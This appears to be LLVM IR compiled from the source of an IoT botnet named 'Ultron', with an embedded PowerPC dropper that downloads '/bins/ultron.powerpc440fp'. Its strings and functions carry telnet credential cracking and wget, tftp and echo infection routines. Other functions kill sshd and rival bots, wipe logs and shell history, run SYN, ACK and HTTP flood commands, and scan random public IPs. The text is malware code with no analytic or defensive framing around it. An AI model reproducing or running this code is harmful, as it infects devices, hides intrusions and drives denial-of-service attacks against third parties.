<\80\10\008`\00\018\84\04t8\A0\00\04K\FF\FEu|\7F\00\D0K\FF\FD\A1;\BD\00\1D<\80\10\008\84\04|\7F\C3\F3x\7F\A5\EBxK\FF\FEU\7F\83\E8\00A\9E\00\0C8`\00\03K\FF\FDy;\A0\00\008\81\00\088\A0\00\01\7F\C3\F3xK\FF\FEi/\83\00\018`\00\04A\9E\00\08K\FF\FDU\89a\00\08W\A9@.<\00\0D\0A`\00\0D\0A}=[x\7F\9D\00\00@\9E\FF\C8;\A1\00\1C8\A0\00\80\7F\A4\EBx\7F\C3\F3xK\FF\FE)\7F\A4\EBx|e\1By\7F\83\E3x@\81\00\0CK\FF\FD\DDK\FF\FF\D8\7F\C3\F3xK\FF\FD1\7F\83\E3xK\FF\FD)<\80\10\008\84\04\A88\A0\00\048`\00\01K\FF\FD\B58`\00\05K\FF\FC\E1\80\01\00\C4\BB\81\00\B08!\00\C0|\08\03\A6N\80\00 K\FF\FE@|`\1Bx|\83#x|\A4+x|\C53x|\E6;x}\07CxD\00\00\02L\83\00 H\00\00\04\94!\FF\E0|\08\02\A6\BF\A1\00\14|}\1Bx\90\01\00$H\00\00!\93\A3\00\008`\FF\FF\80\01\00$\BB\A1\00\148!\00 |\08\03\A6N\80\00 <`\10\018c\04\B0N\80\00 powerpc440fp\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.powerpc440fp HTTP/1.0\0D\0A\0D\0A\00\00FIN\0A\00\00\00\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00.symtab\00.strtab\00.shstrtab\00.text\00.rodata\00.sbss\00.comment\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\1B\00\00\00\01\00\00\00\06\10\00\00\94\00\00\00\94\00\00\03\BC\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00!\00\00\00\01\00\00\002\10\00\04P\00\00\04P\00\00\00`\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00)\00\00\00\08\00\00\00\03\10\01\04\B0\00\00\04\B0\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00/\00\00\00\01\00\00\00\00\00\00\00\00\00\00\04\B0\00\00\00H\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\11\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04\F8\00\00\008\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\02\00\00\00\00\00\00\00\00\00\00\06p\00\00\02@\00\00\00\07\00\00\00\0D\00\00\00\04\00\00\00\10\00\00\00\09\00\00\00\03\00\00\00\00\00\00\00\00\00\00\08\B0\00\00\015\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00\00\94\00\00\00\00\03\00\00\01\00\00\00\00\10\00\04P\00\00\00\00\03\00\00\02\00\00\00\00\10\01\04\B0\00\00\00\00\03\00\00\03\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\05\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\06\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\07\00\00\00\01\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00\07\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00,\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00>\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Q\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Y\10\01\04\B4\00\00\00\04\11\02\00\03\00\00\00f\10\00\01\08\00\00\008\12\00\00\01\00\00\00l\10\00\03\EC\00\00\00$\12\00\00\01\00\00\00t\10\01\04\B4\00\00\00\04!\00\00\03\00\00\00}\10\01\04\B0\00\00\00\04\11\00\00\03\00\00\00\83\10\00\00\DC\00\00\00,\12\00\00\01\00\00\00\8A\10\00\00\B0\00\00\00,\12\00\00\01\00\00\00\92\10\00\01\EC\00\00\00<\12\00\00\01\00\00\00\9A\10\01\04\B4\00\00\00\04\11\00\00\03\00\00\00\A2\10\00\00\94\00\00\00\1C\12\00\00\01\00\00\00\B2\10\00\03\E8\00\00\00\04\12\00\00\01\00\00\00\BA\10\00\01|\00\00\008\12\00\00\01\00\00\00\C1\10\00\01@\00\00\00<\12\00\00\01\00\00\00\CA\10\00\04\10\00\00\004\12\02\00\01\00\00\00\DA\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\E6\10\00\02(\00\00\01\C0\12\00\00\01\00\00\00\EA\10\00\01\B4\00\00\008\12\00\00\01\00\00\00\F0\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\F7\10\01\04\B8\00\00\00\00\10\00\FF\F1\00\00\00\FC\10\00\04D\00\00\00\0C\22\00\00\01\00\00\01\0D\10\01\04\B0\00\00\00\04!\00\00\03\00\00\01\14\10\01\04\B0\00\00\00\04\11\02\00\03\00\00\01\1F\10\00\04D\00\00\00\0C\22\02\00\01\00dlr.c\00libc/sysdeps/linux/powerpc/syscall.S\00__syscall_error.c\00__errno_location.c\00errno.c\00__GI_h_errno\00xopen\00syscall\00_h_errno\00errno\00xclose\00x__exit\00xsocket\00h_errno\00utils_inet_addr\00__start\00xwrite\00xconnect\00__syscall_error\00__bss_start\00run\00xread\00_edata\00_end\00__errno_location\00_errno\00__GI_errno\00__GI___errno_location\00\00", align 1
@scanPid = common global i32 0, align 4
@.str.232 = private unnamed_addr constant [13 x i8] c"kill -9 %s\0D\0A\00", align 1
@.str.233 = private unnamed_addr constant [30 x i8] c"killall -9 sshd;pkill -9 sshd\00", align 1
@.str.234 = private unnamed_addr constant [19 x i8] c"ps -C sshd -o pid=\00", align 1
@.str.235 = private unnamed_addr constant [11 x i8] c"kill -9 %s\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.327 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.261 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.262 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.263 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.276 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1
@.str.277 = private unnamed_addr constant [41 x i8] c"[TELNET] [+] LOGIN CRACKED ---> %s:%s:%s\00", align 1
@.str.278 = private unnamed_addr constant [28 x i8] c"sh\0D\0Ashell\0D\0Asystem\0D\0Aenable\0D\0A\00", align 1
@.str.279 = private unnamed_addr constant [42 x i8] c">%s.ULTRON && cd %s >ULTRON && >.ULTRON\0D\0A\00", align 1
@.str.280 = private unnamed_addr constant [24 x i8] c"/bin/busybox uname -a\0D\0A\00", align 1
@.str.281 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.282 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget || /bin/busybox tftp\0D\0A\00", align 1
@.str.283 = private unnamed_addr constant [5 x i8] c"echo\00", align 1
@.str.284 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting wget infecton: %s:%s:%s\00", align 1
@.str.285 = private unnamed_addr constant [45 x i8] c"[ULTRON] Attempting tftp infection: %s:%s:%s\00", align 1
@.str.286 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting echo infecton: %s:%s:%s\00", align 1
@.str.287 = private unnamed_addr constant [39 x i8] c"/bin/busybox echo -e '%s' >> dropper\0D\0A\00", align 1
@.str.288 = private unnamed_addr constant [41 x i8] c"[ULTRON] Failed echo infection: %s:%s:%s\00", align 1
@.str.289 = private unnamed_addr constant [28 x i8] c"[ULTRON] Finished: %s:%s:%s\00", align 1
@.str.290 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.291 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.292 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.293 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.294 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.295 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.296 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.297 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.298 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.299 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.300 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.301 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.302 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.303 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.304 = private unnamed_addr constant [26 x i8] c"cd /;rm -rf .bash_history\00", align 1
@.str.305 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.306 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.307 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.308 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.309 = private unnamed_addr constant [9 x i8] c"FASTLOAD\00", align 1
@.str.310 = private unnamed_addr constant [22 x i8] c"SCAN <threads> <usec>\00", align 1
@.str.311 = private unnamed_addr constant [19 x i8] c"Starting scanner!!\00", align 1
@.str.312 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.313 = private unnamed_addr constant [5 x i8] c"UATK\00", align 1
@.str.314 = private unnamed_addr constant [5 x i8] c"TATK\00", align 1
@.str.315 = private unnamed_addr constant [5 x i8] c"SATK\00", align 1
@.str.316 = private unnamed_addr constant [13 x i8] c"FUCKALLOFYOU\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.318 = private unnamed_addr constant [6 x i8] c"LMFAO\00", align 1
@.str.319 = private unnamed_addr constant [16 x i8] c"CLEANTHATSHITUP\00", align 1
@.str.320 = private unnamed_addr constant [19 x i8] c"[cleaning] [%s:%s]\00", align 1
@.str.321 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.322 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.323 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.324 = private unnamed_addr constant [29 x i8] c"\1B[34m[\1B[31mUltron\1B[34m] [%s]\00", align 1
@.str.325 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.326 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @bot_killer() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %18, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 184
  br i1 %4, label %5, label %24

; <label>:5:                                      ; preds = %2
  %6 = load i8, i8* @buf, align 1
  %7 = sext i8 %6 to i64
  %8 = inttoptr i64 %7 to i8*
  %9 = load i32, i32* %1, align 4
  %10 = sext i32 %9 to i64
  %11 = getelementptr inbounds [176 x i8*], [176 x i8*]* @Bot_Killer_Binarys, i64 0, i64 %10
  %12 = load i8*, i8** %11, align 8
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %8, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.232, i32 0, i32 0), i8* %12) #5
  %14 = load i8, i8* @buf, align 1
  %15 = sext i8 %14 to i64
  %16 = inttoptr i64 %15 to i8*
  %17 = call i32 @system(i8* %16)
  br label %18

; <label>:18:                                     ; preds = %5
  %19 = load i32, i32* %1, align 4
  %20 = sub i32 %19, -1860749769
  %21 = add i32 %20, 1
  %22 = add i32 %21, -1860749769
  %23 = add nsw i32 %19, 1
  store i32 %22, i32* %1, align 4
  br label %2

; <label>:24:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @port_closer() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.233, i32 0, i32 0))
  %2 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.234, i32 0, i32 0)) #5
  %3 = call i32 @system(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0))
  %4 = call i8* @strcpy(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %5 = load i8, i8* @buf, align 1
  %6 = sext i8 %5 to i64
  %7 = inttoptr i64 %6 to i8*
  %8 = call i32 (i8*, i8*, ...) @sprintf(i8* %7, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %9 = load i8, i8* @buf, align 1
  %10 = sext i8 %9 to i64
  %11 = inttoptr i64 %10 to i8*
  %12 = call i32 @system(i8* %11)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, -1640531527
  %7 = sub i32 %5, %6
  %8 = add i32 %5, -1640531527
  store i32 %7, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %9 = load i32, i32* %2, align 4
  %10 = sub i32 0, %9
  %11 = sub i32 0, -1640531527
  %12 = add i32 %10, %11
  %13 = sub i32 0, %12
  %14 = add i32 %9, -1640531527
  %15 = sub i32 0, -1640531527
  %16 = sub i32 %13, %15
  %17 = add i32 %13, -1640531527
  store i32 %16, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %18

; <label>:18:                                     ; preds = %69, %1
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  br i1 %20, label %21, label %76

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* %3, align 4
  %23 = sub i32 %22, -837328025
  %24 = sub i32 %23, 3
  %25 = add i32 %24, -837328025
  %26 = sub nsw i32 %22, 3
  %27 = sext i32 %25 to i64
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32, i32* %3, align 4
  %31 = sub i32 0, 2
  %32 = add i32 %30, %31
  %33 = sub nsw i32 %30, 2
  %34 = sext i32 %32 to i64
  %35 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = xor i32 %29, -1
  %38 = and i32 %36, %37
  %39 = xor i32 %36, -1
  %40 = and i32 %29, %39
  %41 = or i32 %38, %40
  %42 = xor i32 %29, %36
  %43 = xor i32 %41, -1
  %44 = and i32 1997164696, %43
  %45 = xor i32 1997164696, -1
  %46 = and i32 %41, %45
  %47 = xor i32 -1640531527, -1
  %48 = and i32 %47, 1997164696
  %49 = and i32 -1640531527, %45
  %50 = or i32 %44, %46
  %51 = or i32 %48, %49
  %52 = xor i32 %50, %51
  %53 = xor i32 %41, -1640531527
  %54 = load i32, i32* %3, align 4
  %55 = xor i32 %52, -1
  %56 = and i32 -643662708, %55
  %57 = xor i32 -643662708, -1
  %58 = and i32 %52, %57
  %59 = xor i32 %54, -1
  %60 = and i32 %59, -643662708
  %61 = and i32 %54, %57
  %62 = or i32 %56, %58
  %63 = or i32 %60, %61
  %64 = xor i32 %62, %63
  %65 = xor i32 %52, %54
  %66 = load i32, i32* %3, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %67
  store i32 %64, i32* %68, align 4
  br label %69

; <label>:69:                                     ; preds = %21
  %70 = load i32, i32* %3, align 4
  %71 = sub i32 0, %70
  %72 = sub i32 0, 1
  %73 = add i32 %71, %72
  %74 = sub i32 0, %73
  %75 = add nsw i32 %70, 1
  store i32 %74, i32* %3, align 4
  br label %18

; <label>:76:                                     ; preds = %18
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 %5, -523411390
  %7 = add i32 %6, 1
  %8 = add i32 %7, -523411390
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 1689268702, -1
  %13 = or i32 %10, %11
  %14 = or i32 1689268702, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 0, %24
  %28 = sub i64 0, %26
  %29 = add i64 %27, %28
  %30 = sub i64 0, %29
  %31 = add i64 %24, %26
  store i64 %30, i64* %1, align 8
  %32 = load i64, i64* %1, align 8
  %33 = lshr i64 %32, 32
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* @c, align 4
  %35 = load i64, i64* %1, align 8
  %36 = load i32, i32* @c, align 4
  %37 = zext i32 %36 to i64
  %38 = add i64 %35, 6264429424859549653
  %39 = add i64 %38, %37
  %40 = sub i64 %39, 6264429424859549653
  %41 = add i64 %35, %37
  %42 = trunc i64 %40 to i32
  store i32 %42, i32* %3, align 4
  %43 = load i32, i32* %3, align 4
  %44 = load i32, i32* @c, align 4
  %45 = icmp ult i32 %43, %44
  br i1 %45, label %46, label %56

; <label>:46:                                     ; preds = %0
  %47 = load i32, i32* %3, align 4
  %48 = sub i32 0, 1
  %49 = sub i32 %47, %48
  %50 = add i32 %47, 1
  store i32 %49, i32* %3, align 4
  %51 = load i32, i32* @c, align 4
  %52 = sub i32 %51, -1704820640
  %53 = add i32 %52, 1
  %54 = add i32 %53, -1704820640
  %55 = add i32 %51, 1
  store i32 %54, i32* @c, align 4
  br label %56

; <label>:56:                                     ; preds = %46, %0
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %59 = sub i32 0, %58
  %60 = add i32 %57, %59
  %61 = sub i32 %57, %58
  %62 = load i32, i32* @rand_cmwc.i, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  ret i32 %60
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %20, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, 1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, 1
  store i32 %14, i32* %6, align 4
  %16 = sext i32 %14 to i64
  %17 = getelementptr inbounds i8*, i8** %9, i64 %16
  %18 = load i8*, i8** %17, align 8
  %19 = icmp ne i8* %18, null
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %8
  br label %8

; <label>:21:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %22

; <label>:22:                                     ; preds = %37, %21
  %23 = load i32, i32* %7, align 4
  %24 = load i32, i32* %6, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %43

; <label>:26:                                     ; preds = %22
  %27 = load i8*, i8** %4, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8*, i8** %28, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %27, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %26
  store i32 1, i32* %3, align 4
  br label %44

; <label>:36:                                     ; preds = %26
  br label %37

; <label>:37:                                     ; preds = %36
  %38 = load i32, i32* %7, align 4
  %39 = add i32 %38, -99591523
  %40 = add i32 %39, 1
  %41 = sub i32 %40, -99591523
  %42 = add nsw i32 %38, 1
  store i32 %41, i32* %7, align 4
  br label %22

; <label>:43:                                     ; preds = %22
  store i32 0, i32* %3, align 4
  br label %44

; <label>:44:                                     ; preds = %43, %35
  %45 = load i32, i32* %3, align 4
  ret i32 %45
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = and i64 %37, %31
  %39 = xor i64 %37, %31
  %40 = or i64 %38, %39
  %41 = or i64 %37, %31
  store i64 %40, i64* %36, align 8
  %42 = load i32, i32* %6, align 4
  %43 = add i32 %42, -1159909811
  %44 = add i32 %43, 1
  %45 = sub i32 %44, -1159909811
  %46 = add nsw i32 %42, 1
  %47 = call i32 @select(i32 %45, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %48 = icmp slt i32 %47, 1
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %57

; <label>:50:                                     ; preds = %27
  %51 = load i32, i32* %6, align 4
  %52 = load i8*, i8** %8, align 8
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = call i64 @recv(i32 %51, i8* %52, i64 %54, i32 0)
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %5, align 4
  br label %57

; <label>:57:                                     ; preds = %50, %49
  %58 = load i32, i32* %5, align 4
  ret i32 %58
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
